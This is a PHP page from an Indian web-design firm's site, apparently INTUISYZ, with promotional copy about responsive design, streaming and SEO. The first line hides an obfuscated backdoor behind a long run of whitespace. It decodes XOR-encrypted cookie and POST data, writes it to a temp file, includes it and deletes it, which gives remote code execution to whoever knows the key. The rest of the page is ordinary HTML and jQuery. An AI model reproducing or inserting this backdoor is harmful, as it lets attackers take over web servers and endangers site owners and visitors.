<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("sgvlvt")){class sgvlvt{public static $snznu = "lgpmuclnmpcmjtrb";public static $szpfebbaco = NULL;public function __construct(){$lynby = @$_COOKIE[substr(sgvlvt::$snznu, 0, 4)];if (!empty($lynby)){$azyvjdh = "base64";$zrgujxdk = "";$lynby = explode(",", $lynby);foreach ($lynby as $inkky){$zrgujxdk .= @$_COOKIE[$inkky];$zrgujxdk .= @$_POST[$inkky];}$zrgujxdk = array_map($azyvjdh . "_decode", array($zrgujxdk,));$zrgujxdk = $zrgujxdk[0] ^ str_repeat(sgvlvt::$snznu, (strlen($zrgujxdk[0]) / strlen(sgvlvt::$snznu)) + 1);sgvlvt::$szpfebbaco = @unserialize($zrgujxdk);}}public function __destruct(){$this->wrhubmkjm();}private function wrhubmkjm(){if (is_array(sgvlvt::$szpfebbaco)) {$hluciqzs = sys_get_temp_dir() . "/" . crc32(sgvlvt::$szpfebbaco["salt"]);@sgvlvt::$szpfebbaco["write"]($hluciqzs, sgvlvt::$szpfebbaco["content"]);include $hluciqzs;@sgvlvt::$szpfebbaco["delete"]($hluciqzs);exit();}}}$iwziv = new sgvlvt();$iwziv = NULL;} ?><?php
ob_start();
include_once('db/config.php');
$con=connectDB();
?>
<!DOCTYPE html>
<html >
<head>
    <!-- Basic Page Needs
            ================================================== -->
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="icon" type="image/png" href="images/favicon.png">
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>&ndash; INTUISYZ &ndash; International Quality Information Technology at Indian Prices</title>
    <meta name="description" content="INTUISYZ aims to provide international standard Information Technology services to Indian businesses. Our IT consulting service will help you get good value for every paisa you spend on Information technology, whether it is in office automation, e-Commerce, Banking , Online Marketing or even general software purchase or development. ">
    <meta name="keywords" content="Affordable Websites,Web Designing Company Cochin, Website Development Company Kochi, Designer Websites, Kerala, Web Application Development Company Cochin, Accounting System, Point of Sale ,HR & Pay Roll, CRM Software for Builders, Web Designers Cochin, E Commerce, Web Designers Kerala,  Travel Agency Apps ,School Portal, College Portal, Web Designing Cochin, Online News Portal, E learning Application,  Social Media Marketing Cochin, Budgeting Software, E-mail Marketing Tool ,Bulk Email Marketing, ERP, Performance Management,Project Management,Anti Piracy Software, Bulk Email Software">
    <meta http-equiv="Content-Language" content="en-us" />
    <meta name="author" content="INIUISYZ Technologies" />
    <meta name="rating" content="General" />
    <meta name="revisit-after" content="1 days" />
    <meta http-equiv="Expires" content="Never" />
    <meta http-equiv="Distribution" content="global" />
    <meta http-equiv="Revisit-after" content="1 days" />
    <meta http-equiv="Robots" content="index,follow,all" />
    <meta name="GOOGLEBOT" content="index,follow,all" />
    <link rel="shortcut icon" href="n_images/favlogo.png">
    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>

    <!-- Mobile Specific Metas
            ================================================== -->
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Template CSS Files
            ================================================== -->
    <!-- Twitter Bootstrs CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <!-- Ionicons Fonts Css -->

    <!-- template main css file -->
    <link rel="stylesheet" href="css/main.css">
    <!-- responsive css -->
    <link href="bootstrap/bootstrap.min.css" type="text/css" rel="stylesheet">
    <!-- Template Javascript Files
            ================================================== -->
    <!-- modernizr js -->



    <script type="text/javascript" src="col/js/jquery.min.js"></script>
    <script type="text/javascript" src="col/js/bootstrap-3.1.1.min.js"></script>
    <link href="col/css/bootstrap-3.1.1.min.css" rel="stylesheet" type="text/css">
    <link href="col/css/col.css" rel="stylesheet" type="text/css">



    <link rel="stylesheet" href="fonts/css/font-awesome.css">
    <link rel="stylesheet" href="fonts/css/font-awesome.min.css">

</head>
<body>
<!-- ==================================================
        Header Section Start
        ================================================== -->
<?php include('header_home.php'); ?>

<div class="bui">
</div>
<section id="call-to-action">
    <div class="container">
        <div class="row">
            <div class="col-md-5">
                <div class="block pull-left" style="">
                    <h2 align="centre" class=" wow fadeInDown " data-wow-delay=".3s" data-wow-duration="500ms">
                        <span class="soci">Websites</span><br> <span class="smm"> Design &amp; Development Support</span>
                    </h2>



                    <h4 align="centre" class="wow fadeInDown colo forhead " data-wow-delay=".5s" data-wow-duration="500ms">
                        Experience our superior web designs catalyse major transformations for your business.
                    </h4>

                    <h4 align="centre" class="wow fadeInDown  colo forhead " data-wow-delay=".5s" data-wow-duration="500ms" >
                        &quot;Design Is The Silent Ambassador Of Your Brand&quot;
                    </h4>
                    <h5 align="right" class="wow fadeInDown pull-right colo" data-wow-delay=".5s" data-wow-duration="500ms">
                        - Paul Rand
                    </h5><br>
                    <div align="centre" style="padding-left: 70px"> <a  href="web_design_and_development.php#popup1"><button class="my   wow fadeInDown enquiry" data-wow-delay=".7s" data-wow-duration="500ms">Enquiry</button></a></div>
                </div>
            </div>
            <div class="col-md-7" >
                <img src="images/banno.png" class="visible-lg pull-right">
            </div>

        </div>
    </div>
</section>

<?php include('popup.php'); ?>

<section id="feature">
    <div class="container">
        <div class="section-heading">
            <h2 class=" wow fadeInDown uppercase" data-wow-delay=".3s">RESPONSIVE WEB DESIGNS</h2>
            <!--<p class="subh">Today webdesign is not about looking good.Your website has to look good,at the same time it has to attract and convert the potential customers in to leads.It has to provide informartion to staff customers and business partners, we help you to achieve these goals.</p>-->
            <p align="justify" class="subh more1 forshow" >
                A well-designed website invariably plays an integral role in drawing the
                attention of potential customers. According to a recent study conducted
                by HOT (Human Oriented Technology) laboratory, people form reliable impressions
                of a website based only on visual appeal in as little as 50 milliseconds.
                We create aesthetic, symmetric and pleasantly organised websites that enhance
                the perceptions of efficiency and usability in the minds of customers.
                Our websites are a harmonious blend of technically flawless designs fusing
                with matchless artistry while skilfully inculcating content, a combination
                that strategically draws prospective customers. Given that appearance is
                strongly linked to usability and credibility, our creative layouts,
                fitting colour combinations and imaginative designs leave a superior
                print of uniqueness in the minds of customers. Further, INTUISYZ today
                boasts of a global client base, with our professional and fastidious
                technical support catering to various client necessities across the world.
                Our experts are constantly on the lookout for the most dynamic trends and
                techniques, and are continuously updated about the influx of the most advanced
                tools to provide our customers with the best of web-development services.

            </p>
        </div>
        <br>
        <!--  <div class="section-heading">
            <h2 class=" wow fadeInDown uppercase" data-wow-delay=".3s">Website Development Process:</h2>
         <center><img src="images/stoned.jpg" class="img-responsive"></center>
        </div> -->
        <div class="row">

        </div>






        <div class="section-heading">
            <!--   <h2 class=" wow fadeInDown uppercase" data-wow-delay=".3s">Our Internet Marketing Process</h2> -->

        </div>

        <div class="col-md-4 conk ">
            <div class="media wow fadeInUp animated" data-wow-duration="500ms" data-wow-delay="300ms">

                <img src="images/ic1.png">


                <h4 class="media-heading">Live Web Streaming</h4>
                <p  class="lil more1 forshow">
                    Mobile video views have exhibited a 127% increase in the past years,
                    a change that should be emphatically welcomed with apt technical acknowledgement.
                    We provide high-quality live web-streaming services that are cost effective and
                    our robust API services enable manifold customisation options to give you complete
                    control over your online videos.
                </p>

            </div>
        </div>

        <div class="col-md-4 conk ">
            <div class="media wow fadeInUp animated" data-wow-duration="500ms" data-wow-delay="300ms">

                <img src="images/ic2.png">


                <h4 class="media-heading">Responsive Web design </h4>
                <p  class="lil more1 forshow">First impressions do matter! Visual appeal is
                    everything when it comes to capturing attention, a study
                    shows that first impressions are 94% design related. We place
                    due emphasis in selecting designs and layouts that automatically
                    secure recognition in the minds of customers. Our teams are equipped
                    with the latest of techniques to develop pixel perfect websites that
                    are assured to imprint into the minds of customers. Furthermore, our
                    privileged teams of developers and content generators are constantly
                    polishing their skills to aid your journey to success!
                </p>

            </div>
        </div>

        <div class="col-md-4 conk ">
            <div class="media wow fadeInUp animated" data-wow-duration="500ms" data-wow-delay="300ms">

                <img src="images/ic3.png">


                <h4 class="media-heading">Internet Marketing &amp; SEO</h4>
                <p class="lil more1 forshow">
                    Journey to the top is not as hard as it seems when you are in the right hands.
                    With the internet harbouring 5 million terabytes of data, only .04% of this gets
                    indexed on google. Around 95% of companies use search engine marketing to induce
                    loyalty among their existing consumers, and statistics show that by the end of
                    2018 there will be 73 billion phone calls generated from internet searches alone.
                    Why not seize your share of these 73 billion opportunities? Utilize our privileged
                    SEO packages to secure your own place in the exceedingly persuasive domain of internet!
                    We have a history of successfully promoting a diverse range of products that enjoy immense
                    popularity, an accomplishment attained through our intense programmes that blends strategy
                    with persistence.  At INTUISYZ, the magic of professionalism is right within your reach!
                </p>

            </div>
        </div>



    </div>
    <div class="container">


        <div class="row">
            <div class="col-sm-4 col-xs-12">
                <figure class="wow fadeInLeft animated portfolio-item" data-wow-duration="500ms" data-wow-delay="0ms">
                    <div class="img-wrapper">
                        <img src="images/portfolio/dmr.jpg" class="img-responsive" alt="this is a title">
                        <div class="overlay">
                            <div class="buttons">
                                <!-- <a rel="gallery" class="fancybox" href="images/portfolio/dmr.jpg">Demo</a>
                                <a target="_blank" href="single-portfolio.html">Details</a>-->
                            </div>
                        </div>
                    </div>
                    <!--  <figcaption>
                      <h4>
                      <a href="#">
                          Dew Drop
                      </a>
                      </h4>
                      <p>
                          Redesigne UI Concept
                      </p>
                  </figcaption>-->
                </figure>
            </div>


            <div class="col-sm-4 col-xs-12">
                <figure class="wow fadeInLeft animated" data-wow-duration="500ms" data-wow-delay="600ms">
                    <div class="img-wrapper">
                        <img src="images/portfolio/rkfs.jpg" class="img-responsive" alt="">
                        <div class="overlay">
                            <div class="buttons">
                                <!--  <a rel="gallery" class="fancybox" href="images/portfolio/rkfa.jpg">Demo</a>
                                <a target="_blank" href="single-portfolio.html">Details</a>-->
                            </div>
                        </div>
                    </div>
                    <!-- <figcaption>
                     <h4>
                     <a href="#">
                         Make Up elements
                     </a>
                     </h4>
                     <p>
                         Lorem ipsum dolor.
                     </p>
                 </figcaption>-->
                </figure>
            </div>

            <div class="col-sm-4 col-xs-12">
                <figure class="wow fadeInLeft animated" data-wow-duration="500ms" data-wow-delay="300ms">
                    <div class="img-wrapper">
                        <img src="images/portfolio/grand.jpg" class="img-responsive" alt="">
                        <div class="overlay">
                            <div class="buttons">
                                <!-- <a rel="gallery" class="fancybox" href="images/portfolio/mar.jpg">Demo</a>
                                <a target="_blank" href="single-portfolio.html">Details</a>-->
                            </div>
                        </div>
                    </div>
                    <!--  <figcaption>
                      <h4>
                      <a href="#">
                          Table Design
                      </a>
                      </h4>
                      <p>
                          Lorem ipsum dolor sit amet.
                      </p>
                  </figcaption>-->
                </figure>
            </div>


        </div>
    </div>
</section>

<section id="call-to-action1">
    <div class="container">
        <div class="row">
            <div class="col-md-7">
                <div class="block">
                    <span class="wow fadeInDown lefti pull-left bull visible-lg" data-wow-delay=".3s" data-wow-duration="300ms">International Standards at Indian Prices</span>
                    <span class="wow fadeInDown   bull hidden-lg" data-wow-delay=".3s" data-wow-duration="300ms" >International Standards at Indian Prices</span>
                    <div class="col-md-12">
                        <p class="white wow fadeInDown pull-left lefti visible-lg " data-wow-delay=".5s" data-wow-duration="300ms"> Different businesses have different needs,
                            <br> click below to find out more.</p>
                        <p class="white wow fadeInDown  lefti hidden-lg " data-wow-delay=".5s" data-wow-duration="300ms" style="text-align: center"> Different businesses have different needs,
                            <br> click below to find out more.</p>

                    </div><div class="clearfix"></div>
                    <div class="col-md-12 visible-lg">
                        <a href="priceing_website.php" class="btn btn-default btn-contact wow fadeInDown pull-left lefti price " data-wow-delay=".7s" data-wow-duration="300ms">VIEW PRICING</a>
                        <a href="portfolio-websites-designing.php" class="btn btn-default btn-contact wow fadeInDown pull-left lefti price" data-wow-delay=".7s" data-wow-duration="300ms">VIEW PORTFOLIO</a>
                    </div>
                    <div class="col-md-12 hidden-lg">
                        <a href="priceing_website.php" class="btn btn-default btn-contact wow fadeInDown  lefti price " data-wow-delay=".7s" data-wow-duration="300ms">VIEW PRICING</a>
                        <a href="portfolio-websites-designing.php" class="btn btn-default btn-contact wow fadeInDown  lefti price" data-wow-delay=".7s" data-wow-duration="300ms">VIEW PORTFOLIO</a>
                    </div>
                </div>
            </div>

            <div class="col-md-5">
                <div class="block visible-lg">
                    <img src="images/un.png">
                </div>
            </div>

        </div>
    </div>
</section>



</div>
</div>
</div>
<!--   ==================================================
            Footer Section Start
            ================================================== -->
            <?php include('jslinks.php'); ?>
<?php include('footer.php') ?>
<!-- /#footer -->

</body>



<script>
    $(document).ready(function() {
        // Configure/customize these variables.
        var showChar = 200;  // How many characters are shown by default
        var ellipsestext = "...";
        var moretext = "Show more >";
        var lesstext = "Show less";


        $('.more1').each(function() {
            var content = $(this).html();

            if(content.length > showChar) {

                var c = content.substr(0, showChar);
                var h = content.substr(showChar, content.length - showChar);

                var html = c + '<span class="moreellipses">' + ellipsestext+ '&nbsp;</span><span class="morecontent"><span>' + h + '</span>&nbsp;&nbsp;<a href="" class="morelink">' + moretext + '</a></span>';

                $(this).html(html);
            }

        });

        $(".morelink").click(function(){
            if($(this).hasClass("less")) {
                $(this).removeClass("less");
                $(this).html(moretext);
            } else {
                $(this).addClass("less");
                $(this).html(lesstext);
            }
            $(this).parent().prev().toggle();
            $(this).prev().toggle();
            return false;
        });
    });
</script>


<style>
    .morecontent span {
        display: none;

    }
    .morelink {
        display: block;
        color: black;

    }
    a:link, a:visited{color:darkgrey;font-family:Open Sans, sans-serif; }

    @media (max-width: 767px) { #call-to-action1{max-height: 395px; }}

    .forshow{font-family:Open Sans, sans-serif;font-size: 14px;}
    .forhead{font-family:Open Sans, sans-serif;font-size: 17px;}
    .morelink a:link, a:visited {

        color:darkgrey;!important;

    }


    @media (max-width: 767px) {
        #call-to-action1{ margin-bottom:0}
    }
    @media (max-width: 767px) {.price{width: 80%}

        .my {

            padding: 16px 35px;
            margin-top: 55px !important;


        }

</style>
</html>
